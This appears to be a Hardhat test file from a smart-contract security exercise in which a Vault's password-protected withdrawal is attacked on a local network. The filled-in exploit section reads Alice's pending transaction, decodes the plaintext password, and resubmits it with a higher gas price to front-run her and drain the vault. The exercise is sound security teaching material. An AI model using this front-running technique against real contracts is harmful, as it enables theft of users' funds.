import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers, network } from "hardhat";

describe("FrontRun", function () {
  let alice: SignerWithAddress, attacker: SignerWithAddress;
  const VAULT_BALANCE = ethers.utils.parseEther("10");

  before(async function () {
    /** SETUP - DO NOT TOUCH ANYTHING HERE */
    [alice, attacker] = await ethers.getSigners();

    // Set inital balance of attacker to 0.1 ETH
    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x16345785d8a0000", // 0.1 ETH
    ]);

    // Set inital balance of alice to 11 ETH
    await ethers.provider.send("hardhat_setBalance", [
      alice.address,
      "0x98A7D9B8314C0000", // 11 ETH
    ]);

    // Disable automine on the hardhat network and set the block time to 1 second
    //console.log(network);
    await network.provider.send("evm_setAutomine", [false]);
    await network.provider.send("evm_setIntervalMining", [1000]);

    const VaultFactory = await ethers.getContractFactory("Vault", alice);

    // Generate random password
    // DO NOT ACCESS THIS VARIABLE IN YOUR EXPLOIT
    const password = ethers.utils.randomBytes(32);
    
    const hashedPassword = ethers.utils.keccak256(password);

    this.vault = await VaultFactory.deploy(hashedPassword, {
      value: VAULT_BALANCE,
    });

    await this.vault.deployed();
    
    expect(await this.vault.getHashedSecret()).to.equal(hashedPassword);
    expect(await ethers.provider.getBalance(this.vault.address)).to.equal(
      VAULT_BALANCE
    );

    // ALICE SENDS TX TO WITHDRAW FUNDS
    console.log(`Alice Address: ${alice.address}`)
    await this.vault.unlock(password);
  });

  it("EXPLOIT", async function () {
    /** WRITE YOUR EXPLOIT CODE HERE */
    /** END EXPLOIT CODE */
    const test = await network.provider.send("eth_getBlockByNumber", ["pending", true]);
    const txHash = test.transactions[0].hash;

    const tx = await ethers.provider.getTransaction(txHash);
    
    const iface = new ethers.utils.Interface(['function unlock(bytes)'])
    
    const decodedInput = iface.parseTransaction({ data: tx.data, value: tx.value});
    
    let password = decodedInput.args;
    let x = ethers.utils.arrayify(password[0]);
    //@ts-ignore
    let newGasPrice = tx.gasPrice?.toNumber() + 1;
    //@ts-ignore
    newGasPrice = ethers.utils.parseUnits(newGasPrice.toString(), 'wei');
    await this.vault.connect(attacker).unlock(x, {gasPrice: newGasPrice});

    //const tst = await network.provider.send("eth_getBlockByNumber", ["pending", true]);
  });

  after(async function () {
    // Mine the block to ensure transactions are processed
    network.provider.send("evm_mine");
    expect(await ethers.provider.getBalance(this.vault.address)).to.equal("0");

    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
      VAULT_BALANCE
    );

    expect(await ethers.provider.getBalance(alice.address)).to.be.lt(
      ethers.utils.parseEther("1")
    );
  });
});
